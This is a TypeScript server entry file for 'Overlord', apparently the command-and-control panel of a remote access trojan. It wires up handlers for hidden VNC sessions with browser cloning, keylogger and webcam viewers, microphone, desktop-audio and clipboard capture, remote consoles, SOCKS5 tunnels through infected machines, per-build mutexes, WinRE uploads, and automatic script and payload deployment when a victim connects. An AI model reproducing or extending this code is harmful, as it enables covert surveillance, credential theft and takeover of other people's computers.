import type { ServerWebSocket } from "bun";
import { decodeMessage, encodeMessage, type WireMessage, type PluginManifest } from "./protocol";
import { logger } from "./logger";
import { fileURLToPath } from "url";
import path from "path";
import fs from "fs/promises";
import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, getBuild, getBuildByTag, getAllBuilds, deleteExpiredBuilds, deleteBuild, getNotificationScreenshot, clearNotificationScreenshots, deleteClientRow, getClientIp, banIp, isIpBanned, clientExists, deleteExpiredSharedFiles, getChatHistory, insertChatMessage, getOnlineClientCountForUser, deleteExpiredChatMessages } from "./db";
import { handleFrame, handleHello, handlePing, handlePong } from "./wsHandlers";
import { getMessageByteLength, getMaxPayloadLimit, isAllowedClientMessageType } from "./wsValidation";
import { ClientInfo, ClientRole } from "./types";
import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "./auth";
import { loadConfig, getConfig } from "./config";
import { flushAuditLogsSync } from "./auditLog";
import { getUserById, getUsersForNotificationDelivery, getUsersForNotificationDeliveryByClient, canUserAccessClient, setUserClientAccessRule, setUserClientAccessScope, getUserClientAccessScope, hasPermission } from "./users";
import { requireAuth, requirePermission } from "./rbac";
import { metrics } from "./metrics";
import { ensureDataDir } from "./paths";
import { handleAuthRoutes } from "./server/routes/auth-routes";
import { handleAutoScriptsRoutes } from "./server/routes/auto-scripts-routes";
import { handleEnrollmentRoutes, setPostApproveHook } from "./server/routes/enrollment-routes";
import { handleChatRoutes } from "./server/routes/chat-routes";
import { handleBuildRoutes } from "./server/routes/build-routes";
import { handleSolRoutes } from "./server/routes/sol-routes";
import { handleAssetsRoutes } from "./server/routes/assets-routes";
import { handleDeployRoutes } from "./server/routes/deploy-routes";
import { handleWinRERoutes } from "./server/routes/winre-routes";
import { cleanupFileTransferTempFiles, handleFileDownloadRoutes } from "./server/routes/file-download-routes";
import { handleClientRoutes } from "./server/routes/client-routes";
import { handleMiscRoutes } from "./server/routes/misc-routes";
import { handleNotificationsConfigRoutes } from "./server/routes/notifications-config-routes";
import { handlePageRoutes } from "./server/routes/page-routes";
import { handlePluginRoutes } from "./server/routes/plugin-routes";
import { handleFileShareRoutes } from "./server/routes/file-share-routes";
import { handleUsersRoutes } from "./server/routes/users-routes";
import { handleWebSocketClose, handleWebSocketMessage, handleWebSocketOpen } from "./server/routes/websocket-lifecycle-routes";
import { handleWsUpgradeRoutes } from "./server/routes/ws-upgrade-routes";
import { isAuthorizedAgentRequest } from "./server/agent-auth";
import { generateBuildMutex, sanitizeMutex, sanitizeOutputName } from "./server/build-utils";
import { detectUploadOs, normalizeClientOs, type DeployOs } from "./server/deploy-utils";
import { CORS_HEADERS } from "./server/http-security";
import { mimeType, secureHeaders } from "./server/http-utils";
import { sanitizePluginId } from "./server/plugin-utils";
import { dispatchAutoScriptsForConnection } from "./server/auto-script-dispatch";
import { dispatchAutoDeploysForConnection } from "./server/auto-deploy-dispatch";
import { handleAutoDeployRoutes } from "./server/routes/auto-deploy-routes";
import { consumeHttpDownloadPayload, type PendingHttpDownload } from "./server/http-download-consumer";
import { startBuildProcess as runBuildProcess } from "./server/build-process";
import { createHttpFetchHandler } from "./server/http-dispatch";
import { startMaintenanceLoops } from "./server/maintenance-loops";
import {
  deliverNotificationWithScreenshot,
  storeNotificationScreenshot,
  takePendingNotificationScreenshot,
  type NotificationRecord,
  type PendingNotificationScreenshot,
  type UserDeliveryTarget,
} from "./server/notification-delivery";
import {
  ensurePluginExtracted as ensurePluginExtractedFromRoot,
  listPluginManifests as listPluginManifestsFromRoot,
  loadPluginBundle as loadPluginBundleFromRoot,
  loadPluginStateFromDisk,
  savePluginStateToDisk,
  sendPluginBundle,
  dispatchAutoLoadPlugins,
} from "./server/plugin-state-bundle";
import {
  DISCONNECT_TIMEOUT_MS,
  HEARTBEAT_INTERVAL_MS,
  MAX_WS_MESSAGE_BYTES_CLIENT,
  MAX_WS_MESSAGE_BYTES_VIEWER,
  PRUNE_BATCH,
  STALE_MS,
} from "./server/runtime-constants";
import { ALLOWED_PLATFORMS } from "./server/validation-constants";
import { prepareTlsOptions, logServerStartup } from "./server/tls-bootstrap";
import { createWebSocketRuntime } from "./server/websocket-runtime";
import {
  handleConsoleOutput,
  handleConsoleViewerMessage,
  handleConsoleViewerOpen,
  handleHVNCViewerMessage,
  handleHVNCViewerOpen,
  handleWebcamViewerMessage,
  handleWebcamViewerOpen,
  handleWebcamDevices,
  handleHVNCCloneProgress,
  handleHVNCLookupResult,
  handleHVNCBrowserCheckResult,
  handleHVNCDXGIStatus,
  handleClipboardContent,
  handleRemoteDesktopViewerMessage,
  handleRemoteDesktopViewerOpen,
  hvncStreamingState,
  notifyConsoleClosed,
  notifyRdInputLatency,
  notifyRemoteDesktopStatus,
  rdStreamingState,
  webcamStreamingState,
  sendDesktopCommand,
  sendHVNCCommand,
  stopConsoleOnTarget,
} from "./server/ws-console-rd-hvnc";
import {
  handleFileBrowserMessage as forwardFileBrowserMessage,
  handleFileBrowserViewerMessage,
  handleFileBrowserViewerOpen,
  handleKeyloggerMessage,
  handleKeyloggerViewerMessage,
  handleKeyloggerViewerOpen,
  handleProcessMessage,
  handleProcessViewerMessage,
  handleProcessViewerOpen,
} from "./server/ws-file-process-proxy-keylogger";
import {
  handleProxyTunnelData,
  handleProxyTunnelClose,
  handleProxyConnectResult,
} from "./server/socks5-proxy-manager";
import {
  cleanupVoiceViewer,
  handleVoiceUplink,
  handleVoiceViewerMessage,
  handleVoiceViewerOpen,
} from "./server/ws-voice";
import {
  cleanupDesktopAudioViewer,
  handleDesktopAudioUplink,
  handleDesktopAudioViewerMessage,
  handleDesktopAudioViewerOpen,
} from "./server/ws-desktop-audio";
import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
import { loadOrGenerateVapidKeys } from "./server/web-push";
import * as clientManager from "./clientManager";
import * as sessionManager from "./sessions/sessionManager";
import type { SocketData } from "./sessions/types";
import { SERVER_VERSION } from "./version";


const config = loadConfig();
const isAuthorizedAgent = (req: Request, url: URL) =>
  isAuthorizedAgentRequest(req, url, config.auth.agentToken);

const PORT = config.server.port;
const HOST = config.server.host;
const RUNTIME_ROOT = process.env.OVERLORD_ROOT?.trim()
  ? path.resolve(process.env.OVERLORD_ROOT)
  : fileURLToPath(new URL("..", import.meta.url));
const PUBLIC_ROOT = process.env.OVERLORD_PUBLIC_ROOT?.trim()
  ? path.resolve(process.env.OVERLORD_PUBLIC_ROOT)
  : path.join(RUNTIME_ROOT, "public");
const PLUGIN_ROOT = process.env.OVERLORD_PLUGIN_ROOT?.trim()
  ? path.resolve(process.env.OVERLORD_PLUGIN_ROOT)
  : path.join(RUNTIME_ROOT, "plugins");
const PLUGIN_STATE_PATH = path.join(PLUGIN_ROOT, ".plugin-state.json");
const DATA_DIR = ensureDataDir();
const DEPLOY_ROOT = path.join(DATA_DIR, "deploy");
const WINRE_ROOT = path.join(DATA_DIR, "winre");
const FILE_SHARE_ROOT = path.join(DATA_DIR, "file-share");

const TLS_CERT_PATH = config.tls.certPath;
const TLS_KEY_PATH = config.tls.keyPath;
const TLS_CA_PATH = config.tls.caPath; 
const TLS_CERTBOT = config.tls.certbot;

function envFlagEnabled(name: string): boolean {
  const value = String(process.env[name] || "").trim().toLowerCase();
  return value === "1" || value === "true" || value === "yes" || value === "on";
}

const TLS_OFFLOAD = envFlagEnabled("OVERLORD_TLS_OFFLOAD");

function parseMaxHttpBodyBytes(): number {
  const raw = String(process.env.OVERLORD_MAX_HTTP_BODY_BYTES || "").trim();
  if (raw !== "") {
    const parsed = Number(raw);
    if (Number.isFinite(parsed) && parsed > 0) {
      return Math.floor(parsed);
    }
    logger.warn(`[HTTP] Invalid OVERLORD_MAX_HTTP_BODY_BYTES=${raw}; using default`);
  }
  return 100 * 1024 * 1024;
}

const MAX_HTTP_BODY_BYTES = parseMaxHttpBodyBytes();

const pluginLoadedByClient = new Map<string, Set<string>>();
const pendingPluginEvents = new Map<string, Array<{ event: string; payload: any }>>();
const pluginLoadingByClient = new Map<string, Set<string>>();
let pluginState = { enabled: {} as Record<string, boolean>, lastError: {} as Record<string, string>, autoLoad: {} as Record<string, boolean>, autoStartEvents: {} as Record<string, Array<{ event: string; payload: any }>> };

const savePluginState = () => savePluginStateToDisk(PLUGIN_ROOT, PLUGIN_STATE_PATH, pluginState);
const loadPluginState = async () => {
  pluginState = await loadPluginStateFromDisk(PLUGIN_STATE_PATH);
};
const ensurePluginExtracted = (pluginId: string) =>
  ensurePluginExtractedFromRoot(PLUGIN_ROOT, pluginId, sanitizePluginId);
const listPluginManifests = () =>
  listPluginManifestsFromRoot(PLUGIN_ROOT, pluginState, savePluginState, ensurePluginExtracted);
const loadPluginBundle = (pluginId: string, clientOS?: string, clientArch?: string) =>
  loadPluginBundleFromRoot(PLUGIN_ROOT, pluginId, ensurePluginExtracted, clientOS, clientArch);
const startBuildProcess = (buildId: string, buildConfig: any) =>
  runBuildProcess(buildId, buildConfig, {
    generateBuildMutex,
    sanitizeOutputName,
  });

const pendingHttpDownloads = new Map<string, PendingHttpDownload>();

type DownloadIntent = {
  id: string;
  userId: string;
  clientId: string;
  path: string;
  expiresAt: number;
  timeout: ReturnType<typeof setTimeout>;
};

const downloadIntents = new Map<string, DownloadIntent>();

type DeployUpload = {
  id: string;
  path: string;
  name: string;
  size: number;
  os: DeployOs;
};

const deployUploads = new Map<string, DeployUpload>();

type WinREUpload = {
  id: string;
  path: string;
  name: string;
  size: number;
};

const winreUploads = new Map<string, WinREUpload>();

type NotificationRateState = {
  lastSent: number;
  windowStart: number;
  suppressed: number;
  lastWarned: number;
};

const notificationHistory: NotificationRecord[] = [];
const notificationRate = new Map<string, NotificationRateState>();
const getNotificationConfig = () => getConfig().notifications;

const pendingNotificationScreenshots = new Map<string, PendingNotificationScreenshot>();
const takePendingNotificationScreenshotForClient = (clientId: string) =>
  takePendingNotificationScreenshot(pendingNotificationScreenshots, clientId);
const storeNotificationScreenshotForPending = (
  pending: PendingNotificationScreenshot,
  bytes: Uint8Array,
  format: string,
  width?: number,
  height?: number,
) => storeNotificationScreenshot(notificationHistory, pending, bytes, format, width, height);
const deliverNotificationWithScreenshotForRecord = (record: NotificationRecord) => {
  const getUserDeliveryTargets = (clientId: string): UserDeliveryTarget[] => {
    return getUsersForNotificationDeliveryByClient(clientId)
      .map((u) => ({
        userId: u.id,
        username: u.username,
        webhookEnabled: u.webhook_enabled === 1,
        webhookUrl: u.webhook_url || "",
        webhookTemplate: u.webhook_template,
        telegramEnabled: u.telegram_enabled === 1,
        telegramBotToken: u.telegram_bot_token || "",
        telegramChatId: u.telegram_chat_id || "",
        telegramTemplate: u.telegram_template,
        clientEventWebhook: u.client_event_webhook === 1,
        clientEventTelegram: u.client_event_telegram === 1,
        clientEventPush: u.client_event_push === 1,
      }));
  };
  return deliverNotificationWithScreenshot(record, getUserDeliveryTargets);
};

const notificationPluginHandlers = createNotificationPluginHandlers({
  notificationHistory,
  notificationRate,
  pendingNotificationScreenshots,
  pluginLoadedByClient,
  pluginLoadingByClient,
  pendingPluginEvents,
  pluginState,
  getNotificationConfig,
  canUserAccessClient,
  getUserRole: (userId: number) => getUserById(userId)?.role,
  storeNotificationScreenshot: storeNotificationScreenshotForPending,
  deliverNotificationWithScreenshot: deliverNotificationWithScreenshotForRecord,
  getDeliveryTargetsForClientEvent: (event: string, clientId: string): UserDeliveryTarget[] => {
    const mapRow = (u: any): UserDeliveryTarget => ({
      userId: u.id,
      username: u.username,
      webhookEnabled: u.webhook_enabled === 1,
      webhookUrl: u.webhook_url || "",
      webhookTemplate: u.webhook_template,
      telegramEnabled: u.telegram_enabled === 1,
      telegramBotToken: u.telegram_bot_token || "",
      telegramChatId: u.telegram_chat_id || "",
      telegramTemplate: u.telegram_template,
      clientEventWebhook: u.client_event_webhook === 1,
      clientEventTelegram: u.client_event_telegram === 1,
      clientEventPush: u.client_event_push === 1,
    });
    if (event === "client_purgatory") {
      return getUsersForNotificationDelivery()
        .filter((u) => u.role === "admin" || u.role === "operator")
        .map(mapRow);
    }
    return getUsersForNotificationDeliveryByClient(clientId).map(mapRow);
  },
  savePluginState,
});

type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "notifications_viewer";

type PendingScript = {
  resolve: (result: any) => void;
  reject: (error: any) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};
const pendingScripts = new Map<string, PendingScript>();

type PendingCommandReply = {
  resolve: (result: { ok: boolean; message?: string }) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};
const pendingCommandReplies = new Map<string, PendingCommandReply>();

async function startServer() {
  await loadPluginState();

  setPostApproveHook((clientId: string) => {
    const client = clientManager.getClient(clientId);
    if (!client) return;
    dispatchAutoLoadPlugins(
      client,
      pluginState,
      notificationPluginHandlers.isPluginLoaded,
      notificationPluginHandlers.isPluginLoading,
      notificationPluginHandlers.markPluginLoading,
      notificationPluginHandlers.enqueuePluginEvent,
      loadPluginBundle,
    ).catch((err) => {
      logger.warn(`[enrollment] failed to dispatch auto-load plugins for ${clientId}: ${(err as Error).message}`);
    });
  });

  await cleanupFileTransferTempFiles(DATA_DIR);
  logger.info("[filebrowser] cleaned stale transfer temp files on startup");
  let tls:
    | {
        tlsOptions: { cert?: string; key?: string; ca?: string };
        certPathUsed: string;
        source: "certbot" | "configured" | "self-signed";
      }
    | null = null;

  if (TLS_OFFLOAD) {
    logger.warn(
      "[TLS] OVERLORD_TLS_OFFLOAD=true: TLS is expected to terminate at an external proxy/load balancer.",
    );
    logger.warn("[TLS] Running internal HTTP listener only. Do not expose the container port directly to the internet.");
  } else {
    tls = await prepareTlsOptions({
      certPath: TLS_CERT_PATH,
      keyPath: TLS_KEY_PATH,
      caPath: TLS_CA_PATH,
      certbot: TLS_CERTBOT,
    });
  }

  const routeDeps = {
    notificationsConfig: {
      getNotificationScreenshot,
      secureHeaders,
    },
    build: {
      startBuildProcess,
      sanitizeMutex,
      allowedPlatforms: ALLOWED_PLATFORMS,
    },
    deploy: {
      DEPLOY_ROOT,
      deployUploads,
      detectUploadOs,
      normalizeClientOs,
    },
    autoDeploy: {
      DEPLOY_ROOT,
      detectUploadOs,
    },
    winre: {
      WINRE_ROOT,
      winreUploads,
    },
    fileDownload: {
      DATA_DIR,
      secureHeaders,
      sanitizeOutputName,
      pendingHttpDownloads,
      downloadIntents,
    },
    plugin: {
      PLUGIN_ROOT,
      pluginState,
      pluginLoadedByClient,
      pluginLoadingByClient,
      pendingPluginEvents,
      sanitizePluginId,
      ensurePluginExtracted,
      savePluginState,
      listPluginManifests,
      loadPluginBundle,
      sendPluginBundle,
      markPluginLoading: notificationPluginHandlers.markPluginLoading,
      isPluginLoaded: notificationPluginHandlers.isPluginLoaded,
      isPluginLoading: notificationPluginHandlers.isPluginLoading,
      enqueuePluginEvent: notificationPluginHandlers.enqueuePluginEvent,
      drainPluginUIEvents: notificationPluginHandlers.drainPluginUIEvents,
      secureHeaders,
      mimeType,
    },
    fileShare: {
      FILE_SHARE_ROOT,
    },
    misc: {
      CORS_HEADERS,
      SERVER_VERSION,
      getConsoleSessionCount: sessionManager.getConsoleSessionCount,
      getRdSessionCount: sessionManager.getRdSessionCount,
      getFileBrowserSessionCount: sessionManager.getFileBrowserSessionCount,
      getProcessSessionCount: sessionManager.getProcessSessionCount,
      tlsCertPath: tls?.certPathUsed,
      tlsSource: tls?.source,
    },
    assets: {
      PUBLIC_ROOT,
      secureHeaders,
      mimeType,
    },
    page: {
      PUBLIC_ROOT,
      secureHeaders,
      mimeType,
    },
    client: {
      CORS_HEADERS,
      pendingScripts,
      pendingCommandReplies,
    },
    wsUpgrade: {
      isAuthorizedAgentRequest: isAuthorizedAgent,
    },
  };

  function handleBuildTagConnection(clientId: string, buildTagValue: string) {
    if (!buildTagValue) return;
    const build = getBuildByTag(buildTagValue);
    if (!build || !build.builtByUserId) return;

    const userId = build.builtByUserId;
    const user = getUserById(userId);
    if (!user) return;

    if (user.role === "admin") return;

    const currentScope = getUserClientAccessScope(userId);
    if (currentScope === "none") {
      setUserClientAccessScope(userId, "allowlist");
    }

    if (currentScope === "none" || currentScope === "allowlist") {
      setUserClientAccessRule(userId, clientId, "allow");
      logger.info(`[build-tag] Auto-added client ${clientId} to user ${user.username}'s allowlist (build: ${build.id.substring(0, 8)})`);
    }
  }

  const lifecycleDeps = {
    maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
    maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
    pendingScripts,
    pendingCommandReplies,
    rdStreamingState,
    hvncStreamingState,
    webcamStreamingState,
    getNotificationConfig,
    handleConsoleViewerOpen,
    handleRemoteDesktopViewerOpen,
    handleWebcamViewerOpen,
    handleHVNCViewerOpen,
    handleFileBrowserViewerOpen,
    handleProcessViewerOpen,
    handleKeyloggerViewerOpen,
    handleVoiceViewerOpen,
    handleDesktopAudioViewerOpen,
    handleDashboardViewerOpen: (ws: import("bun").ServerWebSocket<SocketData>) => {
      const id = crypto.randomUUID();
      ws.data.sessionId = id;
      sessionManager.addDashboardSession({
        id,
        viewer: ws,
        createdAt: Date.now(),
        userId: ws.data.userId,
        userRole: ws.data.userRole,
      });
    },
    handleNotificationViewerOpen: notificationPluginHandlers.handleNotificationViewerOpen,
    handleChatViewerOpen: (ws: import("bun").ServerWebSocket<SocketData>) => {
      const id = crypto.randomUUID();
      ws.data.sessionId = id;
      const userId = ws.data.userId;
      const userRole = ws.data.userRole || "viewer";
      const user = userId ? getUserById(userId) : null;
      const username = user?.username || "Unknown";
      sessionManager.addChatSession({
        id,
        viewer: ws,
        createdAt: Date.now(),
        userId: userId || 0,
        username,
        userRole,
      });
      const retDays = getConfig().chat?.retentionDays ?? 30;
      const retMs = retDays > 0 ? retDays * 24 * 60 * 60 * 1000 : undefined;
      const history = getChatHistory(undefined, 50, retMs);
      const enrichedHistory = history.map((m) => ({
        ...m,
        onlineClients: m.userId ? getOnlineClientCountForUser(m.userId) : 0,
      }));
      const canWrite = userId ? hasPermission(userRole as any, "chat:write", userId) : false;
      ws.send(JSON.stringify({ type: "chat_ready", history: enrichedHistory, canWrite, userId: userId || 0 }));
    },
    handleChatViewerMessage: (ws: import("bun").ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => {
      try {
        const text = typeof raw === "string" ? raw : new TextDecoder().decode(raw as ArrayBuffer);
        const parsed = JSON.parse(text);
        if (parsed.type !== "chat_send" || typeof parsed.message !== "string") return;
        const userId = ws.data.userId;
        const userRole = ws.data.userRole || "viewer";
        if (!userId || !hasPermission(userRole as any, "chat:write", userId)) {
          ws.send(JSON.stringify({ type: "chat_error", error: "Permission denied" }));
          return;
        }
        const msg = parsed.message.trim();
        if (!msg || msg.length > 2000) {
          ws.send(JSON.stringify({ type: "chat_error", error: msg ? "Message too long (max 2000 chars)" : "Message is empty" }));
          return;
        }
        const user = getUserById(userId);
        const username = user?.username || "Unknown";
        const record = insertChatMessage(userId, username, userRole, msg);
        const onlineClients = getOnlineClientCountForUser(userId);
        sessionManager.broadcastChatMessage(JSON.stringify({ type: "chat_message", ...record, onlineClients }));
      } catch {}
    },
    handleConsoleViewerMessage,
    handleRemoteDesktopViewerMessage,
    handleWebcamViewerMessage,
    handleHVNCViewerMessage,
    handleFileBrowserViewerMessage,
    handleProcessViewerMessage,
    handleKeyloggerViewerMessage,
    handleVoiceViewerMessage,
    handleDesktopAudioViewerMessage,
    dispatchAutoScriptsForConnection,
    dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
      const proto = tls ? "https" : "http";
      const origin = `${proto}://127.0.0.1:${PORT}`;
      dispatchAutoDeploysForConnection(info, ws, origin);
    },
    dispatchAutoLoadPlugins: (info: import("./types").ClientInfo) => {
      dispatchAutoLoadPlugins(
        info,
        pluginState,
        notificationPluginHandlers.isPluginLoaded,
        notificationPluginHandlers.isPluginLoading,
        notificationPluginHandlers.markPluginLoading,
        notificationPluginHandlers.enqueuePluginEvent,
        loadPluginBundle,
      ).catch((err) => {
        logger.warn(`[plugin-autoload] dispatch error for ${info.id}: ${(err as Error).message}`);
      });
    },
    takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
    storeNotificationScreenshot: storeNotificationScreenshotForPending,
    handleNotificationScreenshotResult: notificationPluginHandlers.handleNotificationScreenshotResult,
    handleConsoleOutput: (clientId: string, payload: any) => handleConsoleOutput(clientId, payload),
    handleFileBrowserMessage: (clientId: string, payload: any) =>
      forwardFileBrowserMessage(clientId, payload, {
        pendingHttpDownloads,
        consumeHttpDownloadPayload: (downloadPayload: any) =>
          consumeHttpDownloadPayload(downloadPayload, pendingHttpDownloads),
      }),
    handleProxyTunnelData,
    handleProxyTunnelClose,
    handleProxyConnectResult,
    handleProcessMessage,
    handleKeyloggerMessage,
    notifyRdInputLatency,
    handleNotificationScreenshotFailure: notificationPluginHandlers.handleNotificationScreenshotFailure,
    handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
    handleNotification: notificationPluginHandlers.handleNotification,
    handleVoiceUplink,
    handleDesktopAudioUplink,
    handleWebcamDevices,
    handleHVNCCloneProgress,
    handleHVNCLookupResult,
    handleHVNCBrowserCheckResult,
    handleHVNCDXGIStatus,
    handleClipboardContent,
    cleanupVoiceViewer,
    cleanupDesktopAudioViewer,
    stopConsoleOnTarget,
    sendDesktopCommand,
    sendHVNCCommand,
    notifyConsoleClosed,
    clearPendingNotificationScreenshots: notificationPluginHandlers.clearPendingNotificationScreenshots,
    clearClientPluginState: notificationPluginHandlers.clearClientPluginState,
    notifyRemoteDesktopStatus,
    handleBuildTagConnection,
    notifyDashboard: sessionManager.notifyDashboardViewers,
    notifyDashboardClientEvent: sessionManager.notifyDashboardClientEvent,
    broadcastClientEvent: notificationPluginHandlers.broadcastClientLifecycleEvent,
  };

  const server = Bun.serve<SocketData>({
    port: PORT,
    hostname: HOST,
    ...(tls ? { tls: tls.tlsOptions } : {}),
    idleTimeout: 255,
    maxRequestBodySize: MAX_HTTP_BODY_BYTES,
    fetch: createHttpFetchHandler({
      metrics,
      CORS_HEADERS,
      handleAuthRoutes,
      handleNotificationsConfigRoutes,
      handleAutoScriptsRoutes,
      handleAutoDeployRoutes,
      handleEnrollmentRoutes,
      handleChatRoutes,
      handleSolRoutes,
      handleUsersRoutes,
      handleBuildRoutes,
      handleDeployRoutes,
      handleWinRERoutes,
      handleFileDownloadRoutes,
      handlePluginRoutes,
      handleFileShareRoutes,
      handleMiscRoutes,
      handleAssetsRoutes,
      handlePageRoutes,
      handleClientRoutes,
      handleWsUpgradeRoutes,
      routeDeps,
    }),
    websocket: createWebSocketRuntime({
      maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
      maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
      lifecycleDeps,
      handleWebSocketOpen,
      handleWebSocketMessage,
      handleWebSocketClose,
    }),
  });

  
  markAllClientsOffline();
  clearNotificationScreenshots();
  loadOrGenerateVapidKeys();
  
  deleteExpiredBuilds();
  logger.info(`[db] Cleaned up expired builds`);

  const expiredPaths = deleteExpiredSharedFiles();
  for (const p of expiredPaths) {
    try { const dir = path.dirname(p); await fs.rm(dir, { recursive: true, force: true }); } catch {}
  }
  if (expiredPaths.length) logger.info(`[db] Cleaned up ${expiredPaths.length} expired shared files`);

  const chatRetentionDays = getConfig().chat?.retentionDays ?? 30;
  if (chatRetentionDays > 0) {
    const retentionMs = chatRetentionDays * 24 * 60 * 60 * 1000;
    const purged = deleteExpiredChatMessages(retentionMs);
    if (purged > 0) logger.info(`[db] Cleaned up ${purged} expired chat messages (retention: ${chatRetentionDays}d)`);
  }

  setInterval(() => {
    const days = getConfig().chat?.retentionDays ?? 30;
    if (days > 0) {
      const ms = days * 24 * 60 * 60 * 1000;
      const count = deleteExpiredChatMessages(ms);
      if (count > 0) logger.info(`[chat] Purged ${count} expired messages (retention: ${days}d)`);
    }
  }, 60 * 60 * 1000); // every hour

  startMaintenanceLoops({
    getClients: clientManager.getAllClients,
    setOnlineState,
    deleteClient: clientManager.deleteClient,
    staleMs: STALE_MS,
    pruneBatch: PRUNE_BATCH,
    heartbeatIntervalMs: HEARTBEAT_INTERVAL_MS,
    disconnectTimeoutMs: DISCONNECT_TIMEOUT_MS,
  });

  if (tls) {
    logServerStartup(server, tls.certPathUsed, tls.source);
    logger.info(`[HTTP] maxRequestBodySize=${MAX_HTTP_BODY_BYTES} bytes`);
  } else {
    const hostname = server.hostname || "0.0.0.0";
    const port = server.port ?? 0;
    logger.info("========================================");
    logger.info("Overlord Server - PROXY TLS OFFLOAD MODE");
    logger.info("========================================");
    logger.info(`HTTP (internal): http://${hostname}:${port}`);
    logger.info(`WS   (internal): ws://${hostname}:${port}/api/clients/{id}/stream/ws`);
    logger.info("");
    logger.info("External access should be HTTPS/WSS via your reverse proxy platform.");
    logger.info("Set this mode only when TLS is terminated by the platform (for example Render). ");
    logger.info(`[HTTP] maxRequestBodySize=${MAX_HTTP_BODY_BYTES} bytes`);
    logger.info("========================================");
  }
}

startServer();


process.on("SIGINT", () => {
  logger.info("\n[server] Shutting down gracefully...");
  flushAuditLogsSync();
  process.exit(0);
});

process.on("SIGTERM", () => {
  logger.info("\n[server] Shutting down gracefully...");
  flushAuditLogsSync();
  process.exit(0);
});

process.on("uncaughtException", (err) => {
  logger.error("[server] uncaught exception:", err);
  flushAuditLogsSync();
  process.exit(1);
});

process.on("unhandledRejection", (reason) => {
  logger.error("[server] unhandled rejection:", reason);
});
